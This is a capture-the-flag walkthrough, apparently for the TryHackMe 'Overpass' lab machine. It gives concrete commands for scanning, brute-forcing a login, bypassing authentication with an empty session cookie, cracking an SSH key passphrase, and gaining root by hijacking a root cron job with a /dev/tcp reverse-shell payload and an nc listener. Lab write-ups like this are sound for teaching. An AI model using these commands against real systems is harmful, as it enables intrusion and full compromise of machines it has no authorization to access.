<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Overpass 1 Writeup</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Overpass 1 Writeup</h1><br/>To find the machine, go here: <a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a><br /><strong><span style="text-decoration:underline;">Enumeration:</span></strong><br />• I started by doing an Nmap Scan using the code:<br />   ◇ <div class="codebox"><pre>nmap -sC -sV -Pn 10.10.74.191</pre></div><br />• The Nmap scan returned only ports 22 and 80 open:<br />   ◇ <img src="images/39-1.png" alt="images/39-1.png" /><br />• I then looked at the website and saw that they had a “downloads” page and an &quot;aboutus&quot; page linked to the main page.<br />   ◇ These pages looked like they were a pretty solid indicated that other pages could exist, so I ran a quick FeroxBuster scan (which returned a ton of information) using the command:<br />      ▪ <div class="codebox"><pre>feroxbuster -u http<span style="color:#bf2e5e;font-weight:400">://</span>10.10.74.191 --smart -w <span style="color:#bf2e5e;font-weight:400">/</span>usr<span style="color:#bf2e5e;font-weight:400">/</span>share<span style="color:#bf2e5e;font-weight:400">/</span>seclists<span style="color:#bf2e5e;font-weight:400">/</span>Discovery<span style="color:#bf2e5e;font-weight:400">/</span>Web-Content<span style="color:#bf2e5e;font-weight:400">/</span>raft-large-directories.txt -x html</pre></div><br />•The important information returned that caught my eye immediately were the /admin page and the /login.js page<br /><br /><strong><span style="text-decoration:underline;">Exploitation:</span></strong><br />• After going to the /admin page, I saw the login and after doing a quick intercept with BurpSuite, I was able to try Hydra on the login using the command:<br />   ◇ <div class="codebox"><pre>hydra -l Ninja -P <span style="color:#bf2e5e;font-weight:400">/</span>usr<span style="color:#bf2e5e;font-weight:400">/</span>share<span style="color:#bf2e5e;font-weight:400">/</span>wordlists<span style="color:#bf2e5e;font-weight:400">/</span>rockyou.txt 10.10.74.191 http-post-form <span style="color:#5ebdab;font-weight:400">&quot;/admin:username=^USER^&amp;password=^PASS^:F=Incorrect&quot;</span> -V</pre></div><br />      ▪ Note: I got the “Ninja” Username from the “aboutus” page, as I remembered seeing a list of some devs on there.<br />   ◇ After running this hydra for a while, I got nowhere and remembered that the original machine information stated “OWASP Top 10”. This led me to believe it was not bruteforcing, so I took it in another direction.<br />• I took another look at the “login.js” page, and near the bottom of the page, I saw the part of the function that said:<br />   ◇ <div class="codebox"><pre>Cookies.set<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;SessionToken&quot;</span>,statusOrCookie<span style="color:#bf2e5e;font-weight:400">)</span></pre></div><br />      ▪ For more information on what this .js function is doing, look at the link:<br />         - <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies</a><br />• Using BurpSuite, I was able to add in the following command into my Burp request, and then send the request 3 times:<br />   ◇ <div class="codebox"><pre>Cookies.set<span style="color:#bf2e5e;font-weight:400">(</span><span style="color:#5ebdab;font-weight:400">&quot;SessionToken&quot;</span>,<span style="color:#5ebdab;font-weight:400">&quot;&quot;</span><span style="color:#bf2e5e;font-weight:400">)</span></pre></div><br />• This last request resulted in the following page appearing:<br />   ◇ <img src="images/39-2.png" alt="images/39-2.png" />   <br />• From there, we now can copy and paste that ssh key into a text file and save it as id_rsa<br />   ◇ We already know from the above site that the username is likely James, but if we try to log in, we are asked for the key&#39;s password<br />   ◇ To crack this, we can use the SSH2John software from GitHub using the following command:<br />      ▪ <div class="codebox"><pre>ssh2john id_rsa &gt; id_rsa.hash</pre></div><br />   ◇ Then, we can run JohnTheRipper on this new file using the command:<br />      ▪ <div class="codebox"><pre>john id_rsa.hash --wordlist=~<span style="color:#bf2e5e;font-weight:400">/</span>Documents<span style="color:#bf2e5e;font-weight:400">/</span>Wordlists<span style="color:#bf2e5e;font-weight:400">/</span>rockyou.txt</pre></div><br />• After running the previous command, we get the ssh file password<br />• Once we are in, we are able to grab the user.txt flag!<br /><br /><strong><span style="text-decoration:underline;">PrivEsc:</span></strong><br />• To get the root flag, we need to do some privesc.<br />   ◇ I first tried running the following command to find any files that ran with root perms that I could use GTFO Bins to leverage:<br />      ▪ <div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">find</span> <span style="color:#bf2e5e;font-weight:400">/</span>  -perm <span style="color:#bf2e5e;font-weight:400">/</span>4000 2&gt;<span style="color:#bf2e5e;font-weight:400">/</span>dev<span style="color:#bf2e5e;font-weight:400">/</span>null</pre></div><br />      ▪ After some searching through that output, nothing stuck out or worked.<br />   ◇ I moved on and spun up my server on my own system using python3&#39;s “HTTP.Server” module and then used wget on the target system to download linPEAS on it<br />   ◇ I ran the linPEAS and it returned one potential privesc vector with a cronjob that runs as root:<br />      ▪ <img src="images/39-3.png" alt="images/39-3.png" /><br />      ▪ This is the cron job that was found:<br />         -<div class="codebox"><pre> * * * * * root curl overpass.thm<span style="color:#bf2e5e;font-weight:400">/</span>downloads<span style="color:#bf2e5e;font-weight:400">/</span>src<span style="color:#bf2e5e;font-weight:400">/</span>buildscript.sh <span style="color:#bf2e5e;font-weight:400">|</span> <span style="color:#bf2e5e;font-weight:400">bash</span></pre></div><br />         - This could also be found by running the command:<br />            → <div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">cat</span> <span style="color:#bf2e5e;font-weight:400">/</span>etc<span style="color:#bf2e5e;font-weight:400">/</span>crontab</pre></div><br />   ◇ Remembering back to the To Do List in James&#39; home directory, I remembered him having something in there about seeing how the builds were downloaded and built<br />      ▪ If we want to get the system to curl our file instead of the file that it is getting, we need to redirect the traffic to us by changing the IP in the /etc/hosts file<br />   ◇ After changing the IP to our IP Address for the “overpass.thm” in the /etc/hosts file, we need to create the appropriate src directory and file for the system to grab from us. This can be done with the following commands:<br />      ▪ <div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">sudo</span> <span style="color:#bf2e5e;font-weight:400">mkdir</span> -p <span style="color:#bf2e5e;font-weight:400">/</span>downloads<span style="color:#bf2e5e;font-weight:400">/</span>src<span style="color:#bf2e5e;font-weight:400">/</span><br /><span style="color:#bf2e5e;font-weight:400">echo</span> <span style="color:#5ebdab;font-weight:400">&quot;bash -i &gt;&amp; /dev/tcp/[Your IP HERE]/[YOUR PORT HERE] 0&gt;&amp;1&quot;</span> &gt; <span style="color:#bf2e5e;font-weight:400">/</span>downloads<span style="color:#bf2e5e;font-weight:400">/</span>src<span style="color:#bf2e5e;font-weight:400">/</span>buildscript.sh<br />python3 -m http.server 80</pre></div><br />         - Then, open another terminal tab and run nc by typing:<br />      ▪ <div class="codebox"><pre>nc -nlvp [The port number you chose]</pre></div><br />   ◇ After about a minute or so, you shoud then get a root shell on the target system where you can then grab the root flag!<br /><br /><strong><span style="text-decoration:underline;">Other Info:</span></strong><br />I hope you enjoyed this walkthrough! Check out my other ones here and let me know what you think!<br />	 <a href="https://github.com/F81nj3ct0r/TryHackMe_Writeups.git">https://github.com/F81nj3ct0r/TryHackMe_Writeups</a><br />You can reach me by email at f8injector@outlook.com<br />Happy Hacking!</div>
</body>
</html>
